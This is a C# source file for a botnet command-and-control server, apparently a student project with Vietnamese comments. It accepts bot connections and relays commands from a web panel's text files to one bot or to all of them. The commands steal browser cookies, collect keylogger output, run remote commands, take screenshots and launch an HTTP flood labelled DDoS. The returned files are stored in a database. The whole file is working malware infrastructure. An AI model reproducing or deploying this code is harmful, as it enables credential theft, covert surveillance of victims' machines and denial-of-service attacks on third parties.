﻿using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server
{
    internal class Program
    {
        static Dictionary<TcpClient, string> clients = new Dictionary<TcpClient, string>();
        static int PORT_NUMBER = 9669;
        private const int BUFFER_SIZE = 1024;
        static ASCIIEncoding encoding = new ASCIIEncoding();
        public static WebClient webClient = new WebClient();
        public static string[] botActive = new string[5];
        public static string[] commandBot = new string[5];
        public static string[] preBotActive = new string[5];
        public static string[] preCommandBot = new string[5];
        static Boolean isFinished = true;

        private static DateTime timeStop;

        public static void sendMessageSocket(string message, Socket socket)
        {
            if (socket.Connected)
            {
                byte[] data = encoding.GetBytes(message);
                socket.Send(data);
            }
        }
        public static string receiveMessageSocket(Socket socket)
        {
            byte[] data = new byte[BUFFER_SIZE];
            socket.Receive(data);
            string rs = encoding.GetString(data);
            return rs;
        }
        public static void checkServerOn(TcpListener listener)
        {
            while (true)
            {
                TcpClient tcplient = listener.AcceptTcpClient();
            }    
        }
        public static void handleConnectSocket(TcpListener listener)
        {
            while (true)
            {
                TcpClient tcplient = listener.AcceptTcpClient();
                Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
                DB.addNewBot(tcplient);
                string clientName = ((IPEndPoint)tcplient.Client.RemoteEndPoint).ToString();
                bool hasConnect = false;
                foreach (var pair in clients)
                {
                    if (pair.Value == clientName)
                    {
                        hasConnect = true;
                    }
                }
                if(!hasConnect)
                {
                     clients.Add(tcplient, clientName);  
                }
                // moi them doan ni
                else
                {
                    for (int i = 0; i < clients.Count; i++)
                    {
                        if (clients.Values.ElementAt(i) == clientName)
                        {
                            clients.Remove(clients.Keys.ElementAt(i));
                            clients.Add(tcplient, clientName);
                            break;
                        }
                    }
                }    
                //

            }
        }
        public static void handleControlBot(TcpListener listener)
        {
            while (true)
            {

                string filePathBotActive = "D:\\xampp\\htdocs\\PBL4_php_main\\txt\\botActive.txt";
                string filePathCommandBot = "D:\\xampp\\htdocs\\PBL4_php_main\\txt\\commandBot.txt";
                FileInfo fileInfo1 = new FileInfo(filePathBotActive);
                FileInfo fileInfo2 = new FileInfo(filePathCommandBot);
                if (isFinished == false)
                {
                    continue;
                }
                if (fileInfo1.Exists || fileInfo2.Exists)
                {
                    if (fileInfo1.Length == 0 || fileInfo2.Length == 0)
                    {
                        continue;
                    }
                }
                botActive = File.ReadAllText(filePathBotActive).Split('&'); // 0: id //1: ip //2: port
                commandBot = File.ReadAllText(filePathCommandBot).Split('&'); // 0: command //1: detail(link,cmd,...)

                string idBot = botActive[0];
                string ipBotActive = botActive[1];


                string command = commandBot[0];
                string detail = commandBot[1];

                if (command == "http")
                {
                    handleCommandAllClients(command, detail);
                }
                else
                {
                    if (idBot.Equals("All"))
                    {
                        handleCommandAllClients(command, detail);
                    }
                    else
                    {
                        int portBotActive = int.Parse(botActive[2]);
                        handleCommandOneClient(idBot, command, detail, ipBotActive + ":" + portBotActive);
                    }
                }

                StreamWriter sw = new StreamWriter(filePathCommandBot, false);
                sw.Write("");
                sw.Close();
            }
        }
        public static async void handleCommandOneClient(string id, string command, string detail, string ipandport)
        {
            TcpClient clientSelected = new TcpClient();
            Boolean check = false;
            foreach (var pair in clients)
            {
                if (pair.Value == ipandport)
                {
                    clientSelected = pair.Key;
                    check = true;
                    break;
                }
            }
            if(check==true)
            {

                if (command == "getcookie")
                {
                    isFinished = false;
                    string ms = "cookies?" + detail + "?";
                    sendMessageSocket(ms, clientSelected.Client);
                    receiveFileSocket(clientSelected, "cookies");
                    readFileAndInsertDB(clientSelected, id, "cookies", detail);
                    isFinished = true;
                }
                else if (command == "getcmd")
                {
                    isFinished = false;
                    string ms = "command?" + detail;
                    sendMessageSocket(ms, clientSelected.Client);
                    receiveFileSocket(clientSelected, "cmd");
                    readFileAndInsertDB(clientSelected, id, "cmd", detail);
                    isFinished = true;

                }
                else if (command == "getcapture")
                {
                    isFinished = false;
                    string ms = "capture";
                    sendMessageSocket(ms, clientSelected.Client);
                    receiveFileSocket(clientSelected, "capture");
                    readFileAndInsertDB(clientSelected, id, "capture", detail);
                    isFinished = true;

                }
                else if (command == "getkeylogger")
                {
                    isFinished = false;
                    string ms = "keylogger";
                    timeStop = DateTime.Now;
                    sendMessageSocket(ms, clientSelected.Client);
                    receiveFileSocket(clientSelected, "keylogger");
                    string timeStartClient = receiveMessageSocket(clientSelected.Client);
                    String time = timeStartClient.Trim() + "?" + timeStop.ToString() + "?";
                    readFileAndInsertDB(clientSelected, id, "keylogger", time); // detail thay bằng time
                    isFinished = true;

                }
                else if (command == "exit")
                {
                    isFinished = false;
                    string ms = "exit?stop";
                    sendMessageSocket(ms, clientSelected.Client);
                    if (clients.ContainsKey(clientSelected))
                    {
                        clientSelected.Close();
                        clients.Remove(clientSelected);
                    }
                    isFinished = true;

                }
                else
                {
                    Console.WriteLine("Command invalid");
                }
            }
            else
            {
                DB.resetCommandBot();
            }    

        }

        public static async void handleCommandAllClients(string command, string detail)
        {

            command = command.Trim().ToLower();

            if (command == "exit")
            {

            }
            else if(command == "http")
            {
                string ms = "http?" + detail+"?";
                List<Task> ddos = new List<Task>();
                foreach (var cli in clients.Keys)
                {
                    ddos.Add(Task.Run(async () =>
                    {
                        try
                        {
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket(ms, cli.Client);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }
                Console.WriteLine("Excute ddos");

            }    
            else if (command == "getcookie")
            {

                string ms = "cookies?" + detail + "?";
                List<Task> cookies = new List<Task>();
                isFinished = false;
                foreach (var cli in clients.Keys)
                {
                    cookies.Add(Task.Run(async () =>
                    {
                        try
                        {
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket(ms, cli.Client);
                            receiveFileSocket(cli, "cookies");
                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
                            readFileAndInsertDB(cli, id, "cookies", detail);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }
                await Task.WhenAll(cookies);
                isFinished = true;
                Console.WriteLine("Nhan thanh cong cac file cookies tu botnet.");
            }
            else if (command == "getkeylogger")
            {

                List<Task> keyloggerTasks = new List<Task>();

                isFinished = false;
                foreach (var cli in clients.Keys)
                {
                    keyloggerTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket("keylogger", cli.Client);
                            Console.WriteLine("Sending request get keylogger to " + ip + "...");
                            receiveFileSocket(cli, "keylogger");
                            timeStop = DateTime.Now;
                            string timeStartClient = receiveMessageSocket(cli.Client);
                            String time = timeStartClient.Trim() + "?" + timeStop.ToString() + "?";
                            Console.WriteLine("Receive keylogger from " + ip + "!");
                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
                            readFileAndInsertDB(cli, id, "keylogger", time);
                            isFinished = true;
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }

                await Task.WhenAll(keyloggerTasks);
                isFinished = true;
                Console.WriteLine("Nhan thanh cong cac file keylogger tu botnet.");
            }
            else if (command == "getcmd")
            {

                string ms = "command?" + detail + "?";

                List<Task> cmdTasks = new List<Task>();
                isFinished = false;

                foreach (var cli in clients.Keys)
                {
                    cmdTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket(ms, cli.Client);
                            Console.WriteLine("Sending request get cmd to " + ip + "...");
                            receiveFileSocket(cli, "cmd");
                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
                            readFileAndInsertDB(cli, id, "cmd", detail);
                            Console.WriteLine("Receive file cmd from " + ip + "!");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }

                await Task.WhenAll(cmdTasks);
                isFinished = true;
                Console.WriteLine("Nhan thanh cong cac file cmd tu botnet.");
            }
            else if (command == "getcapture")
            {


                List<Task> captureTasks = new List<Task>();
                isFinished = false;

                foreach (var cli in clients.Keys)
                {
                    captureTasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            string ms = "capture";
                            clients.TryGetValue(cli, out string ip);
                            sendMessageSocket(ms, cli.Client);
                            Console.WriteLine("Sending request get capture to " + ip + "...");
                            receiveFileSocket(cli, "capture");
                            string id = DB.getIdByIpAndPort(ip.Split(':')[0], ip.Split(':')[1]);
                            readFileAndInsertDB(cli, id, "capture", detail);
                            Console.WriteLine("Receive file capture from " + ip + "!");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
                        }
                    }));
                }

                await Task.WhenAll(captureTasks);
                isFinished = true;
                Console.WriteLine("Nhan thanh cong cac file capture tu botnet.");
            }

        }

        public static void receiveFileSocket(TcpClient client, string type)
        {
            string ip = client.Client.RemoteEndPoint.ToString().Split(':')[0];
            string fileName = "";
            if (type == "cookies")
            {
                fileName = ip + "-getcookies.txt";
            }
            else if (type == "keylogger")
            {

                fileName = ip + "-getkeylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = ip + "-getcmd.txt";
            }
            else if (type == "capture")
            {
                fileName = ip + "-getcapture.png";
            }
            if (!client.Connected)
            {
                return;
            }
            NetworkStream stream = client.GetStream();

            byte[] fileSizeBytes = new byte[4];
            int bytes = stream.Read(fileSizeBytes, 0, 4);
            int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);

            int bytesLeft = dataLength;
            byte[] data = new byte[dataLength];

            int bufferSize = 1024;
            int bytesRead = 0;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);
                if (client.Available < curDataSize)
                    curDataSize = client.Available; //This saved me

                bytes = stream.Read(data, bytesRead, curDataSize);

                bytesRead += curDataSize;
                bytesLeft -= curDataSize;

            }
            using (FileStream fs = new FileStream(fileName, FileMode.Create)) // Ghi lại từ đầu
            {
                fs.Write(data, 0, data.Length);
            }
        }
        public static void readFileAndInsertDB(TcpClient client, string id, string type, string detail)
        {
            string ip = client.Client.RemoteEndPoint.ToString().Split(':')[0];
            string fileName = "";
            if (type == "cookies")
            {
                fileName = ip + "-getcookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = ip + "-getkeylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = ip + "-getcmd.txt";
            }
            else if (type == "capture")
            {
                fileName = ip + "-getcapture.png";
            }

            string rs = "";

            if (File.Exists(fileName))
            {
                if (type != "capture")
                {
                    string[] lines = File.ReadAllLines(fileName);
                    foreach (string line in lines)
                    {
                        rs += line + "\n";
                    }
                }
            }
            else
            {
                rs = "The file " + fileName + " does not exist\n You need get " + fileName + " from botnet\n";
            }
            if (type == "capture")
            {
                string base64Img = convertToBase64(fileName);
                DB.insertDB(id, type, detail, base64Img);
            }
            else
            {
                DB.insertDB(id, type, detail, rs);
            }
        }

        static string convertToBase64(string path)
        {
            Bitmap image = new Bitmap(path);

            byte[] imageBytes;
            using (MemoryStream ms = new MemoryStream())
            {
                image.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                imageBytes = ms.ToArray();
            }
            string base64String = Convert.ToBase64String(imageBytes);
            return base64String;
        }
        static string GetLastIPv4Address()
        {
            NetworkInterface[] networkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
            string lastIPv4Address = null;

            foreach (NetworkInterface networkInterface in networkInterfaces)
            {
                // Kiểm tra xem nếu là interface WiFi và có địa chỉ IPv4
                if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211)
                {
                    IPInterfaceProperties properties = networkInterface.GetIPProperties();

                    foreach (UnicastIPAddressInformation ip in properties.UnicastAddresses)
                    {
                        // Kiểm tra nếu là địa chỉ IPv4
                        if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            // Lưu lại địa chỉ IPv4 hiện tại
                            lastIPv4Address = ip.Address.ToString();
                        }
                    }
                }
            }

            // Trả về địa chỉ IPv4 cuối cùng (hoặc null nếu không tìm thấy)
            return lastIPv4Address;
        }
        static void Main(string[] args)
        {
            try
            {
                string ipv4Address = GetLastIPv4Address();
                IPAddress address = IPAddress.Parse(ipv4Address);
                TcpListener listener2 = new TcpListener(address, 9668);
                listener2.Start();
                DB.resetCommandBot();
                DB.resetBotStatus();
              //  IPAddress address = IPAddress.Parse("172.20.10.4");
                //IPAddress address = IPAddress.Parse("10.10.28.178");


                TcpListener listener = new TcpListener(address, PORT_NUMBER);
                listener.Start();
          
                Console.WriteLine("Server started on " + listener.LocalEndpoint);
                Console.WriteLine("Waiting for a connection...");

                Thread th_server_listener = new Thread(() => handleConnectSocket(listener));
                th_server_listener.Start();


                Thread th_check_port = new Thread(() => checkServerOn(listener2));
                th_check_port.Start();

                Thread th_server_handleCommand = new Thread(() => handleControlBot(listener));
                th_server_handleCommand.Start();
            }
            catch (Exception ex)
            {
            }
        }

    }
}
